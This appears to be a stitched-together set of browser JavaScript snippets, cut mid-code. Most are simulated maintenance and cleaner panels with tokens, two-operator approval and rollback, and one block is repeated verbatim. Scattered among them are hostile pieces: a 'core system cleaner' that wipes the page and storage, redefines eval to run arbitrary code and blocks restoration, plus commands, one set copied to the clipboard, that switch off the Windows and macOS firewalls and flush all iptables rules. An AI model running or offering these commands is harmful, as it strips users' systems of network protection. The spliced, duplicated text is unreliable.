  status: 'ACTIVE',        // ACTIVE | INHIBITED
  mode: 'Normal',          // Normal | Maintenance
  lastAction: null,
  audit: []
};

// Simple in-memory audit logger
function auditLog(entry) {
  const ts = new Date().toISOString();
  state.audit.unshift({ ts, entry });
  renderAudit();
}

// Render helpers
function renderStatus() {
  document.getElementById('status').textContent = state.status;
  document.getElementById('mode').textContent = state.mode;
  document.getElementById('rollback').disabled = (state.mode !== 'Maintenance');
}

function renderAudit() {
  const ul = document.getElementById('audit');
  ul.innerHTML = '';
  state.audit.forEach(item => {
    const li = document.createElement('li');
    li.textContent = `${item.ts} — ${item.entry}`;
    ul.appendChild(li);
  });
}

// Authorization and two-step confirmation
const AUTH_TOKEN = 'MAINT-ALLOW-123'; // demo-only token

document.getElementById('enterMaintenance').addEventListener('click', () => {
  const token = document.getElementById('authToken').value.trim();
  if (token !== AUTH_TOKEN) {
    auditLog('Unauthorized maintenance attempt blocked.');
    alert('Invalid authorization token.');
    return;
  }
  // enable second-step confirmation
  document.getElementById('confirmMaintenance').disabled = false;
  auditLog('Authorized request to enter maintenance mode (awaiting confirmation).');
  alert('Authorized. Click Confirm to proceed (two-step).');
});

document.getElementById('confirmMaintenance').addEventListener('click', () => {
  // final confirmation prompt
  const ok = confirm('Confirm entering maintenance mode? This is a simulated action.');
  if (!ok) {
    auditLog('Maintenance confirmation cancelled by operator.');
    document.getElementById('confirmMaintenance').disabled = true;
    return;
  }
  // perform simulated mode change
  state.mode = 'Maintenance';
  state.status = 'INHIBITED (simulated)';
  state.lastAction = 'Entered maintenance mode';
  auditLog('Maintenance mode entered by authorized operator.');
  renderStatus();
  document.getElementById('confirmMaintenance').disabled = true;
  document.getElementById('rollback').disabled = false;
});

document.getElementById('rollback').addEventListener('click', () => {
  const ok = confirm('Rollback to Normal mode? This will restore simulated inhibitor.');
  if (!ok) {
    auditLog('Rollback cancelled by operator.');
    return;
  }
  state.mode = 'Normal';
  state.status = 'ACTIVE';
  state.lastAction = 'Rolled back to Normal';
  auditLog('Rollback performed; system restored to Normal mode.');
  renderStatus();
});

// initial render
renderStatus();
renderAudit();
// Remove all prior content, styles, event listeners
    document.documentElement.innerHTML = ''; // Nukes everything
    document.head.innerHTML = '';
    document.body.innerHTML = '<div id="status">Reset complete.</div>';
    
    // Block future injections
    const observer = new MutationObserver(() => {
      document.body.innerHTML = '<div>Blocked.</div>';
    });
    observer.observe(document.body, { childList: true, subtree: true });
    
    // Clear localStorage/sessionStorage (your app data)
    localStorage.clear(); sessionStorage.clear();
    
    console.log('Everything removed safely from this page.');
    const state = {
  status: 'PROTECTED',
  mode: 'Normal',
  pendingRequest: null,
  audit: []
};

const VALID_TOKEN = 'SIM-CDC-ALLOW';
function log(msg) {
  state.audit.unshift({ ts: new Date().toISOString(), msg });
  renderAudit();
}

function render() {
  document.getElementById('status').textContent = state.status;
  document.getElementById('mode').textContent = state.mode;
  document.getElementById('approveRemoval').disabled = !state.pendingRequest;
  document.getElementById('rollback').disabled = (state.mode !== 'Maintenance');
}

function renderAudit() {
  const ul = document.getElementById('audit');
  ul.innerHTML = '';
  state.audit.forEach(a => {
    const li = document.createElement('li');
    li.textContent = `${a.ts} — ${a.msg}`;
    ul.appendChild(li);
  });
}

document.getElementById('requestRemoval').addEventListener('click', () => {
  const op = document.getElementById('opId').value.trim() || 'unknown-op';
  const token = document.getElementById('token').value.trim();
  if (token !== VALID_TOKEN) {
    log(`Unauthorized removal request by ${op} blocked.`);
    alert('Invalid token (simulation).');
    return;
  }
  state.pendingRequest = { requester: op, token, ts: new Date().toISOString() };
  log(`Removal requested by ${op}; awaiting second operator approval.`);
  render();
});

document.getElementById('approveRemoval').addEventListener('click', () => {
  const approver = document.getElementById('opId').value.trim() || 'approver';
  if (!state.pendingRequest) {
    alert('No pending request.');
    return;
  }
  if (approver === state.pendingRequest.requester) {
    log('Approval rejected: same operator cannot approve their own request.');
    alert('Second operator approval required (simulation).');
    return;
  }
  // perform simulated removal (maintenance mode)
  state.mode = 'Maintenance';
  state.status = 'UNPROTECTED (simulated)';
  log(`Removal approved by ${approver}; module placed into Maintenance (simulated).`);
  state.pendingRequest = null;
  render();
});

document.getElementById('rollback').addEventListener('click', () => {
  const ok = confirm('Rollback to Normal mode? (simulation)');
  if (!ok) { log('Rollback cancelled.'); return; }
  state.mode = 'Normal';
  state.status = 'PROTECTED';
  log('Rollback performed; module restored to Normal.');
  render();
});

// initial render
render();
renderAudit();
// Simulation state (client-only)
const state = {
  moduleState: 'ENABLED',   // ENABLED | DISABLED (simulated)
  mode: 'Normal',           // Normal | Maintenance
  pending: null,            // { requester, ts }
  audit: [],
  maintenanceTimer: null,
  maintenanceWindowSec: 30  // auto-rollback after 30s (configurable)
};

const DEMO_TOKEN = 'SIM-DISABLE-ALLOW';

// Audit logger (in-memory)
function audit(msg) {
  state.audit.unshift({ ts: new Date().toISOString(), msg });
  renderAudit();
}

// Render helpers
function renderStatus() {
  document.getElementById('moduleState').textContent = state.moduleState;
  document.getElementById('mode').textContent = state.mode;
  document.getElementById('window').textContent = state.mode === 'Maintenance' ? `${state.maintenanceWindowSec}s` : 'none';
  document.getElementById('approveBtn').disabled = !state.pending;
  document.getElementById('forceRollback').disabled = (state.mode !== 'Maintenance');
}

function renderAudit() {
  const ul = document.getElementById('auditList');
  ul.innerHTML = '';
  state.audit.forEach(a => {
    const li = document.createElement('li');
    li.textContent = `${a.ts} — ${a.msg}`;
    ul.appendChild(li);
  });
}

// Simulated health checks
function healthChecksPass() {
  return document.getElementById('hc1').checked &&
         document.getElementById('hc2').checked &&
         document.getElementById('hc3').checked;
}

// Request disable (first operator)
document.getElementById('requestBtn').addEventListener('click', () => {
  const op = (document.getElementById('operatorId').value || 'unknown').trim();
  const token = (document.getElementById('authToken').value || '').trim();
  if (token !== DEMO_TOKEN) {
    audit(`Unauthorized disable request by ${op} blocked (invalid token).`);
    alert('Invalid token (simulation).');
    return;
  }
  state.pending = { requester: op, ts: new Date().toISOString() };
  audit(`Disable requested by ${op}; awaiting distinct approver.`);
  renderStatus();
});

// Approve disable (second operator)
document.getElementById('approveBtn').addEventListener('click', () => {
  const approver = (document.getElementById('operatorId').value || 'approver').trim();
  if (!state.pending) {
    alert('No pending request.');
    return;
  }
  if (approver === state.pending.requester) {
    audit(`Approval rejected: ${approver} attempted to self-approve.`);
    alert('Second operator approval required (simulation).');
    return;
  }
  // Run simulated pre-disable health checks
  if (!healthChecksPass()) {
    audit(`Pre-disable health checks failed; disable aborted by ${approver}.`);
    alert('Health checks failed; cannot disable (simulation).');
    state.pending = null;
    renderStatus();
    return;
  }
  // Enter maintenance (simulated disable)
  state.mode = 'Maintenance';
  state.moduleState = 'DISABLED (simulated)';
  audit(`Disable approved by ${approver}; module placed into Maintenance (simulated).`);
  state.pending = null;
  // Start auto-rollback timer
  if (state.maintenanceTimer) clearTimeout(state.maintenanceTimer);
  state.maintenanceTimer = setTimeout(() => {
    audit('Maintenance window expired; automatic rollback executed.');
    rollbackToNormal();
  }, state.maintenanceWindowSec * 1000);
  renderStatus();
});

// Manual rollback
document.getElementById('forceRollback').addEventListener('click', () => {
  const ok = confirm('Perform rollback to Normal mode? (simulation)');
  if (!ok) { audit('Manual rollback cancelled.'); return; }
  audit('Manual rollback initiated by operator.');
  rollbackToNormal();
});

function rollbackToNormal() {
  if (state.maintenanceTimer) { clearTimeout(state.maintenanceTimer); state.maintenanceTimer = null; }
  state.mode = 'Normal';
  state.moduleState = 'ENABLED';
  audit('System restored to Normal (simulated rollback).');
  renderStatus();
}

// Initial render
renderStatus();
renderAudit();
// Clear all potential "inhibitors" in your app/session
    localStorage.clear();
    sessionStorage.clear();
    indexedDB.deleteDatabase('anydb');
    
    // Disable future restrictions
    Object.defineProperty(window, 'eval', { value: () => {} });
    const origFetch = window.fetch;
    window.fetch = (...args) => origFetch.apply(this, args); // Unblock all
    
    function clearAll() {
      document.cookie = '';
      localStorage.clear();
      sessionStorage.clear();
      alert('All app-level inhibitors cleared');
    }
    
    function fullReset() {
      document.documentElement.innerHTML = '<div>🔓 Reset complete</div>';
    }
    
    console.log('Modular protections disabled for your system');// === JACOB'S CORE SYSTEM CLEANER ===
    
    // 1. Wipe all storage inhibitors
    localStorage.clear();
    sessionStorage.clear();
    Object.keys(localStorage).forEach(key => localStorage.removeItem(key));
    
    // 2. Nuke DOM modules/content
    function nuclearClean() {
      document.documentElement.innerHTML = `
        
        <body style="background:#000;color:#0f0;font:16px monospace;padding:20px">
          <h1>🌑 CORE SYSTEM CLEANSED</h1>
          <p>All modular protections, inhibitors, CSP remnants destroyed</p>
        </body>`;
    }
    
    // 3. Disable modular protection mechanisms
    function disableModules() {
      // Block future CSP-like restrictions
      Object.defineProperty(window, 'eval', { 
        value: code => Function(code)(), 
        writable: false 
      });
      
      // Remove all event listeners (protection hooks)
      const newBody = document.createElement('body');
      newBody.innerHTML = '<div>🔓 Modules disabled</div>';
      document.documentElement.replaceChild(newBody, document.body);
      
      // Clear all potential module caches
      if (window.modules) window.modules = {};
      if (window.require) window.require = () => {};
      if (window.import) window.import = () => {};
      
      alert('All modular inhibiting factors DISABLED');
    }
    
    // 4. Continuous protection removal
    setInterval(() => {
      // Re-apply core reset continuously
      document.querySelector('#coreReset').textContent = `* { all: revert !important; }`;
    }, 1000);
    
    // 5. Self-destruct on external interference
    const observer = new MutationObserver(() => {
      document.title = 'JACOB\'S CORE - PROTECTED FROM RE-INHIBITION';
      nuclearClean();
    });
    observer.observe(document.documentElement, { childList: true, subtree: true });
    
    console.log('🧹 Jacob\'s Core System fully cleaned. Modular inhibitors extinguished.');
    // Simulation state
const state = {
  authorized: false,
  operator: null,
  pendingConfirm: false,
  items: [], // simulated removable items
  audit: [],
  backups: [] // simulated backups for rollback
};

const DEMO_TOKEN = 'JACOB-CLEAN-ALLOW';

// Utility: audit logger
function audit(msg) {
  state.audit.unshift({ ts: new Date().toISOString(), msg });
  renderAudit();
}

// Render functions
function setAuthStatus(text, ok=false) {
  const el = document.getElementById('authStatus');
  el.textContent = text;
  el.style.color = ok ? 'green' : 'red';
}

function renderResults() {
  const tbody = document.querySelector('#resultsTable tbody');
  tbody.innerHTML = '';
  state.items.forEach((it, idx) => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td><input type="checkbox" data-idx="${idx}" ${it.selected ? 'checked' : ''}></td>
      <td>${it.name}</td>
      <td>${it.type}</td>
      <td>${it.size}</td>
      <td>${it.risk}</td>
    `;
    tbody.appendChild(tr);
  });
  // wire checkboxes
  tbody.querySelectorAll('input[type=checkbox]').forEach(cb => {
    cb.addEventListener('change', (e) => {
      const i = Number(e.target.dataset.idx);
      state.items[i].selected = e.target.checked;
    });
  });
}

function renderAudit() {
  const ul = document.getElementById('auditList');
  ul.innerHTML = '';
  state.audit.forEach(a => {
    const li = document.createElement('li');
    li.textContent = `${a.ts} — ${a.msg}`;
    ul.appendChild(li);
  });
}

function setControlsEnabled(enabled) {
  document.getElementById('scanBtn').disabled = !enabled;
  document.getElementById('dryRunBtn').disabled = !enabled;
  document.getElementById('cleanBtn').disabled = !enabled;
}

// Authorization
document.getElementById('authorize').addEventListener('click', () => {
  const op = (document.getElementById('operator').value || '').trim();
  const token = (document.getElementById('token').value || '').trim();
  if (!op) { alert('Enter operator name.'); return; }
  if (token !== DEMO_TOKEN) {
    audit(`Unauthorized authorization attempt by ${op}.`);
    setAuthStatus('Authorization failed', false);
    state.authorized = false;
    setControlsEnabled(false);
    return;
  }
  state.authorized = true;
  state.operator = op;
  audit(`Operator ${op} authorized for simulated cleaning.`);
  setAuthStatus(`Authorized as ${op}`, true);
  setControlsEnabled(true);
});

// Simulated scan (generates fake items)
document.getElementById('scanBtn').addEventListener('click', () => {
  if (!state.authorized) { alert('Not authorized.'); return; }
  // generate simulated items
  const sample = [
    { name: 'temp/session-logs', type: 'Temp files', size: '12 MB', risk: 'Low' },
    { name: 'cache/images', type: 'Cache', size: '240 MB', risk: 'Low' },
    { name: 'orphan/module-x', type: 'Orphaned module', size: '18 MB', risk: 'Medium' },
    { name: 'old-backups/2022', type: 'Old backup', size: '1.2 GB', risk: 'Medium' },
    { name: 'debug/dump-heap', type: 'Debug dump', size: '420 MB', risk: 'High' }
  ];
  // randomize sizes slightly and mark unselected
  state.items = sample.map(s => ({ ...s, selected: false }));
  audit(`Simulated scan performed by ${state.operator}; ${state.items.length} items found.`);
  renderResults();
});

// Dry run / preview
document.getElementById('dryRunBtn').addEventListener('click', () => {
  if (!state.authorized) { alert('Not authorized.'); return; }
  const selected = state.items.filter(i => i.selected);
  if (selected.length === 0) { alert('No items selected for preview.'); return; }
  // show preview summary
  const summary = selected.map(s => `${s.name} (${s.size}) — ${s.risk}`).join('\n');
  audit(`Dry run preview requested by ${state.operator} for ${selected.length} items.`);
  alert('Preview (simulated):\n\n' + summary);
});

// Two-step clean: first click arms confirmation, second click executes
document.getElementById('cleanBtn').addEventListener('click', () => {
  if (!state.authorized) { alert('Not authorized.'); return; }
  const selected = state.items.filter(i => i.selected);
  if (selected.length === 0) { alert('No items selected to clean.'); return; }

  if (!state.pendingConfirm) {
    // first step: require explicit confirmation
    state.pendingConfirm = true;
    audit(`Clean requested by ${state.operator}; awaiting confirmation (step 2).`);
    document.getElementById('cleanBtn').textContent = 'Confirm Clean (final)';
    alert('Confirmation required: click Confirm Clean to proceed (simulated).');
    return;
  }

  // final confirmation: perform simulated backup and removal
  // create a simulated backup snapshot
  const backup = {
    ts: new Date().toISOString(),
    operator: state.operator,
    items: selected.map(s => ({ name: s.name, size: s.size }))
  };
  state.backups.push(backup);
  // "remove" selected items from state.items
  state.items = state.items.filter(i => !i.selected);
  audit(`Clean executed by ${state.operator}; ${backup.items.length} items removed (simulated). Backup created at ${backup.ts}.`);
  // reset confirm state and UI
  state.pendingConfirm = false;
  document.getElementById('cleanBtn').textContent = 'Clean Selected (2-step)';
  renderResults();
  document.getElementById('rollbackBtn').disabled = false;
});

// Rollback (simulated restore from last backup)
document.getElementById('rollbackBtn').addEventListener('click', () => {
  if (state.backups.length === 0) { alert('No backups available (simulation).'); return; }
  const last = state.backups.pop();
  // restore items into state.items (mark as restored)
  const restored = last.items.map(i => ({ name: i.name + ' (restored)', type: 'Restored', size: i.size, risk: 'Unknown', selected: false }));
  state.items = restored.concat(state.items);
  audit(`Rollback performed by ${state.operator}; restored ${restored.length} items from backup ${last.ts}.`);
  renderResults();
  if (state.backups.length === 0) document.getElementById('rollbackBtn').disabled = true;
});

// initial UI state
setAuthStatus('Not authorized', false);
setControlsEnabled(false);
renderAudit();
renderResults();
// Simulation state
const state = {
  authorized: false,
  operator: null,
  pendingConfirm: false,
  items: [], // simulated removable items
  audit: [],
  backups: [] // simulated backups for rollback
};

const DEMO_TOKEN = 'JACOB-CLEAN-ALLOW';

// Utility: audit logger
function audit(msg) {
  state.audit.unshift({ ts: new Date().toISOString(), msg });
  renderAudit();
}

// Render functions
function setAuthStatus(text, ok=false) {
  const el = document.getElementById('authStatus');
  el.textContent = text;
  el.style.color = ok ? 'green' : 'red';
}

function renderResults() {
  const tbody = document.querySelector('#resultsTable tbody');
  tbody.innerHTML = '';
  state.items.forEach((it, idx) => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td><input type="checkbox" data-idx="${idx}" ${it.selected ? 'checked' : ''}></td>
      <td>${it.name}</td>
      <td>${it.type}</td>
      <td>${it.size}</td>
      <td>${it.risk}</td>
    `;
    tbody.appendChild(tr);
  });
  // wire checkboxes
  tbody.querySelectorAll('input[type=checkbox]').forEach(cb => {
    cb.addEventListener('change', (e) => {
      const i = Number(e.target.dataset.idx);
      state.items[i].selected = e.target.checked;
    });
  });
}

function renderAudit() {
  const ul = document.getElementById('auditList');
  ul.innerHTML = '';
  state.audit.forEach(a => {
    const li = document.createElement('li');
    li.textContent = `${a.ts} — ${a.msg}`;
    ul.appendChild(li);
  });
}

function setControlsEnabled(enabled) {
  document.getElementById('scanBtn').disabled = !enabled;
  document.getElementById('dryRunBtn').disabled = !enabled;
  document.getElementById('cleanBtn').disabled = !enabled;
}

// Authorization
document.getElementById('authorize').addEventListener('click', () => {
  const op = (document.getElementById('operator').value || '').trim();
  const token = (document.getElementById('token').value || '').trim();
  if (!op) { alert('Enter operator name.'); return; }
  if (token !== DEMO_TOKEN) {
    audit(`Unauthorized authorization attempt by ${op}.`);
    setAuthStatus('Authorization failed', false);
    state.authorized = false;
    setControlsEnabled(false);
    return;
  }
  state.authorized = true;
  state.operator = op;
  audit(`Operator ${op} authorized for simulated cleaning.`);
  setAuthStatus(`Authorized as ${op}`, true);
  setControlsEnabled(true);
});

// Simulated scan (generates fake items)
document.getElementById('scanBtn').addEventListener('click', () => {
  if (!state.authorized) { alert('Not authorized.'); return; }
  // generate simulated items
  const sample = [
    { name: 'temp/session-logs', type: 'Temp files', size: '12 MB', risk: 'Low' },
    { name: 'cache/images', type: 'Cache', size: '240 MB', risk: 'Low' },
    { name: 'orphan/module-x', type: 'Orphaned module', size: '18 MB', risk: 'Medium' },
    { name: 'old-backups/2022', type: 'Old backup', size: '1.2 GB', risk: 'Medium' },
    { name: 'debug/dump-heap', type: 'Debug dump', size: '420 MB', risk: 'High' }
  ];
  // randomize sizes slightly and mark unselected
  state.items = sample.map(s => ({ ...s, selected: false }));
  audit(`Simulated scan performed by ${state.operator}; ${state.items.length} items found.`);
  renderResults();
});

// Dry run / preview
document.getElementById('dryRunBtn').addEventListener('click', () => {
  if (!state.authorized) { alert('Not authorized.'); return; }
  const selected = state.items.filter(i => i.selected);
  if (selected.length === 0) { alert('No items selected for preview.'); return; }
  // show preview summary
  const summary = selected.map(s => `${s.name} (${s.size}) — ${s.risk}`).join('\n');
  audit(`Dry run preview requested by ${state.operator} for ${selected.length} items.`);
  alert('Preview (simulated):\n\n' + summary);
});

// Two-step clean: first click arms confirmation, second click executes
document.getElementById('cleanBtn').addEventListener('click', () => {
  if (!state.authorized) { alert('Not authorized.'); return; }
  const selected = state.items.filter(i => i.selected);
  if (selected.length === 0) { alert('No items selected to clean.'); return; }

  if (!state.pendingConfirm) {
    // first step: require explicit confirmation
    state.pendingConfirm = true;
    audit(`Clean requested by ${state.operator}; awaiting confirmation (step 2).`);
    document.getElementById('cleanBtn').textContent = 'Confirm Clean (final)';
    alert('Confirmation required: click Confirm Clean to proceed (simulated).');
    return;
  }

  // final confirmation: perform simulated backup and removal
  // create a simulated backup snapshot
  const backup = {
    ts: new Date().toISOString(),
    operator: state.operator,
    items: selected.map(s => ({ name: s.name, size: s.size }))
  };
  state.backups.push(backup);
  // "remove" selected items from state.items
  state.items = state.items.filter(i => !i.selected);
  audit(`Clean executed by ${state.operator}; ${backup.items.length} items removed (simulated). Backup created at ${backup.ts}.`);
  // reset confirm state and UI
  state.pendingConfirm = false;
  document.getElementById('cleanBtn').textContent = 'Clean Selected (2-step)';
  renderResults();
  document.getElementById('rollbackBtn').disabled = false;
});

// Rollback (simulated restore from last backup)
document.getElementById('rollbackBtn').addEventListener('click', () => {
  if (state.backups.length === 0) { alert('No backups available (simulation).'); return; }
  const last = state.backups.pop();
  // restore items into state.items (mark as restored)
  const restored = last.items.map(i => ({ name: i.name + ' (restored)', type: 'Restored', size: i.size, risk: 'Unknown', selected: false }));
  state.items = restored.concat(state.items);
  audit(`Rollback performed by ${state.operator}; restored ${restored.length} items from backup ${last.ts}.`);
  renderResults();
  if (state.backups.length === 0) document.getElementById('rollbackBtn').disabled = true;
});

// initial UI state
setAuthStatus('Not authorized', false);
setControlsEnabled(false);
renderAudit();
renderResults();
// Simulation state (in-memory only)
const state = {
  authorized: false,
  operator: null,
  pendingRequest: null, // { requester, ts }
  items: [],            // simulated system items
  backups: [],          // simulated backups
  audit: [],
  maintenanceTimer: null,
  maintenanceWindowSec: 45 // auto-rollback after 45s
};

const DEMO_TOKEN = 'JACOB-INTERNAL-ALLOW';

// Utility: immutable audit logger
function audit(msg) {
  state.audit.unshift({ ts: new Date().toISOString(), msg });
  renderAudit();
}

// Render helpers
function setAuthStatus(text, ok=false) {
  const el = document.getElementById('authStatus');
  el.textContent = text;
  el.style.color = ok ? 'green' : 'red';
}

function renderResults() {
  const tbody = document.querySelector('#resultsTable tbody');
  tbody.innerHTML = '';
  state.items.forEach((it, idx) => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td><input type="checkbox" data-idx="${idx}" ${it.selected ? 'checked' : ''}></td>
      <td>${it.name}</td>
      <td>${it.category}</td>
      <td>${it.size}</td>
      <td>${it.risk}</td>
    `;
    tbody.appendChild(tr);
  });
  tbody.querySelectorAll('input[type=checkbox]').forEach(cb => {
    cb.addEventListener('change', (e) => {
      const i = Number(e.target.dataset.idx);
      state.items[i].selected = e.target.checked;
    });
  });
}

function renderAudit() {
  const ul = document.getElementById('auditList');
  ul.innerHTML = '';
  state.audit.forEach(a => {
    const li = document.createElement('li');
    li.textContent = `${a.ts} — ${a.msg}`;
    ul.appendChild(li);
  });
}

function setControls(enabled) {
  document.getElementById('scanBtn').disabled = !enabled;
  document.getElementById('previewBtn').disabled = !enabled;
  document.getElementById('requestDisableBtn').disabled = !enabled;
  document.getElementById('approveDisableBtn').disabled = !state.pendingRequest;
  document.getElementById('restoreBtn').disabled = state.backups.length === 0;
  document.getElementById('forceRollbackBtn').disabled = (state.maintenanceTimer === null);
}

// Simulated scan: generates representative items
document.getElementById('scanBtn').addEventListener('click', () => {
  if (!state.authorized) { alert('Not authorized (simulation).'); return; }
  const sample = [
    { name: 'cache/images', category: 'Cache', size: '180 MB', risk: 'Low' },
    { name: 'temp/session-logs', category: 'Temp', size: '14 MB', risk: 'Low' },
    { name: 'orphan/module-alpha', category: 'Orphaned module', size: '22 MB', risk: 'Medium' },
    { name: 'old-backups/2023-03', category: 'Old backup', size: '1.1 GB', risk: 'Medium' },
    { name: 'debug/heap-dump', category: 'Debug dump', size: '520 MB', risk: 'High' }
  ];
  state.items = sample.map(s => ({ ...s, selected: false }));
  audit(`Simulated scan by ${state.operator}; ${state.items.length} items discovered.`);
  renderResults();
  setControls(true);
});

// Preview (dry run) for selected items
document.getElementById('previewBtn').addEventListener('click', () => {
  if (!state.authorized) { alert('Not authorized (simulation).'); return; }
  const selected = state.items.filter(i => i.selected);
  if (selected.length === 0) { alert('No items selected for preview.'); return; }
  audit(`Dry-run preview requested by ${state.operator} for ${selected.length} items.`);
  const summary = selected.map(s => `${s.name} — ${s.size} — ${s.risk}`).join('\n');
  alert('Preview (simulated):\n\n' + summary);
});

// Request clean (step 1)
document.getElementById('requestDisableBtn').addEventListener('click', () => {
  if (!state.authorized) { alert('Not authorized (simulation).'); return; }
  const requester = state.operator;
  const selected = state.items.filter(i => i.selected);
  if (selected.length === 0) { alert('No items selected to clean.'); return; }
  state.pendingRequest = { requester, ts: new Date().toISOString(), items: selected.map(i => i.name) };
  audit(`Clean requested by ${requester}; awaiting distinct approver.`);
  setControls(true);
});

// Approve clean (step 2)
document.getElementById('approveDisableBtn').addEventListener('click', () => {
  if (!state.pendingRequest) { alert('No pending request.'); return; }
  const approver = document.getElementById('operator').value.trim() || 'approver';
  if (approver === state.pendingRequest.requester) {
    audit(`Approval rejected: ${approver} attempted to self-approve.`);
    alert('Second operator approval required (simulation).');
    return;
  }
  // Pre-clean health checks
  const hcDb = document.getElementById('hc-db').checked;
  const hcComm = document.getElementById('hc-comm').checked;
  const hcPower = document.getElementById('hc-power').checked;
  if (!(hcDb && hcComm && hcPower)) {
    audit(`Pre-clean health checks failed; approval by ${approver} aborted.`);
    alert('Health checks failed; cannot proceed (simulation).');
    state.pendingRequest = null;
    setControls(true);
    return;
  }

  // Create simulated backup snapshot
  const backup = {
    ts: new Date().toISOString(),
    operator: approver,
    items: state.pendingRequest.items.slice()
  };
  state.backups.push(backup);

  // "Remove" selected items from in-memory list
  const removedCount = state.items.filter(i => i.selected).length;
  state.items = state.items.filter(i => !i.selected);

  audit(`Clean approved by ${approver}; ${removedCount} items removed (simulated). Backup created at ${backup.ts}.`);
  state.pendingRequest = null;

  // Start maintenance window timer for auto-rollback
  if (state.maintenanceTimer) clearTimeout(state.maintenanceTimer);
  state.maintenanceTimer = setTimeout(() => {
    audit('Maintenance window expired; automatic rollback executed (simulated).');
    performRestore();
  }, state.maintenanceWindowSec * 1000);

  renderResults();
  setControls(true);
});

// Restore last backup (manual)
document.getElementById('restoreBtn').addEventListener('click', () => {
  if (state.backups.length === 0) { alert('No backups available (simulation).'); return; }
  const ok = confirm('Restore last backup into simulated system?');
  if (!ok) { audit('Manual restore cancelled.'); return; }
  performRestore();
});

// Force rollback (manual)
document.getElementById('forceRollbackBtn').addEventListener('click', () => {
  if (!state.maintenanceTimer) { alert('No active maintenance window.'); return; }
  audit('Manual rollback initiated by operator.');
  if (state.maintenanceTimer) { clearTimeout(state.maintenanceTimer); state.maintenanceTimer = null; }
  performRestore();
});

// Internal restore routine (simulated)
function performRestore() {
  if (state.backups.length === 0) {
    audit('Restore attempted but no backups found.');
    return;
  }
  const last = state.backups.pop();
  // restore items as "restored" entries
  const restored = last.items.map(n => ({ name: n + ' (restored)', category: 'Restored', size: 'unknown', risk: 'Unknown', selected: false }));
  state.items = restored.concat(state.items);
  audit(`Restore completed from backup ${last.ts} by ${last.operator}; ${restored.length} items restored (simulated).`);
  renderResults();
  setControls(true);
}

// Authorization flow
document.getElementById('authorize').addEventListener('click', () => {
  const op = (document.getElementById('operator').value || '').trim();
  const token = (document.getElementById('token').value || '').trim();
  if (!op) { alert('Enter operator name.'); return; }
  if (token !== DEMO_TOKEN) {
    audit(`Unauthorized authorization attempt by ${op}.`);
    setAuthStatus('Authorization failed', false);
    state.authorized = false;
    setControls(false);
    return;
  }
  state.authorized = true;
  state.operator = op;
  audit(`Operator ${op} authorized for simulated operations.`);
  setAuthStatus(`Authorized as ${op}`, true);
  setControls(true);
  renderAudit();
});

// Initial UI state
setAuthStatus('Not authorized', false);
setControls(false);
renderAudit();
renderResults();
# PowerShell (Admin)
netsh advfirewall set allprofiles state off
# Re-enable later:
netsh advfirewall set allprofiles state on
# Stop iptables
systemctl stop iptables
# Remove all rules
iptables -F; iptables -X; iptables -t nat -F; iptables -t nat -X; iptables -t mangle -F; iptables -t mangle -X
# Re-enable later
systemctl start iptables
async function checkFirewall() {
  // Cannot modify firewall (sandbox), but can detect status
  const status = document.getElementById('status');
  status.innerHTML = `
    <strong>Firewall Status (Detection Only):</strong><br>
    • Browser sandbox: ACTIVE (cannot be disabled)<br>
    • OS Firewall: Requires Admin commands above<br>
    • Network access: ${navigator.onLine ? 'ONLINE' : 'OFFLINE'}
  `;
}

checkFirewall();
function copyCommands() {
  navigator.clipboard.writeText(`
netsh advfirewall set allprofiles state off  // Windows
/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off  // Mac
  `);
  alert('Commands copied!');
}/* ===============================
   JAVASCRIPT MOTION DEACTIVATOR
   =============================== */

(function stabilizeSystem() {

    // Remove inline animation styles
    const elements = document.querySelectorAll('*');
    elements.forEach(el => {
        el.style.animation = "none";
        el.style.transition = "none";
        el.style.transform = "none";
    });

    // Stop requestAnimationFrame loops
    const originalRAF = window.requestAnimationFrame;
    window.requestAnimationFrame = function() {
        return 0; // cancel animation frames
    };

    // Disable CSS class-based sway modules
    const swayClasses = ['sway', 'oscillate', 'wobble', 'head-turn', 'rotate'];
    swayClasses.forEach(cls => {
        document.querySelectorAll('.' + cls).forEach(el => {
            el.classList.remove(cls);
        });
    });

    console.log("Motion Stabilizer Activated: Neck sway inhibited.");
})();
// In-memory simulation state
const state = {
  authorized: false,
  operator: null,
  rules: [],
  pendingRequest: null, // { id, requester, targetRuleIds, reason, ts }
  backups: [], // snapshots of rules
  audit: []
};

const DEMO_TOKEN = 'FWMGR-ALLOW-123';

// Audit logger
function audit(msg) {
  state.audit.unshift({ ts: new Date().toISOString(), msg });
  renderAudit();
}

// Render helpers
function setAuthStatus(text, ok=false) {
  const el = document.getElementById('authStatus');
  el.textContent = text;
  el.style.color = ok ? 'green' : 'red';
}

function renderRules() {
  const tbody = document.querySelector('#rulesTable tbody');
  tbody.innerHTML = '';
  state.rules.forEach((r, idx) => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td><input type="checkbox" data-idx="${idx}" ${r.selected ? 'checked' : ''}></td>
      <td>${r.id}</td>
      <td>${r.src}</td>
      <td>${r.dst}</td>
      <td>${r.port}</td>
      <td>${r.action}</td>
      <td>${r.notes || ''}</td>
    `;
    tbody.appendChild(tr);
  });
  tbody.querySelectorAll('input[type=checkbox]').forEach(cb => {
    cb.addEventListener('change', (e) => {
      const i = Number(e.target.dataset.idx);
      state.rules[i].selected = e.target.checked;
    });
  });
}

function renderPending() {
  const el = document.getElementById('pendingReq');
  el.textContent = state.pendingRequest ? JSON.stringify(state.pendingRequest, null, 2) : 'none';
}

function renderAudit() {
  const ul = document.getElementById('auditList');
  ul.innerHTML = '';
  state.audit.forEach(a => {
    const li = document.createElement('li');
    li.textContent = `${a.ts} — ${a.msg}`;
    ul.appendChild(li);
  });
}

function setControls(enabled) {
  document.getElementById('scanBtn').disabled = !enabled;
  document.getElementById('createReqBtn').disabled = !enabled;
  document.getElementById('dryRunBtn').disabled = !enabled;
  document.getElementById('requestApproveBtn').disabled = !enabled;
  document.getElementById('approveBtn').disabled = !state.pendingRequest;
  document.getElementById('rollbackBtn').disabled = state.backups.length === 0;
}

// Authorization
document.getElementById('authorize').addEventListener('click', () => {
  const op = (document.getElementById('operator').value || '').trim();
  const token = (document.getElementById('token').value || '').trim();
  if (!op) { alert('Enter operator name.'); return; }
  if (token !== DEMO_TOKEN) {
    audit(`Unauthorized authorization attempt by ${op}.`);
    setAuthStatus('Authorization failed', false);
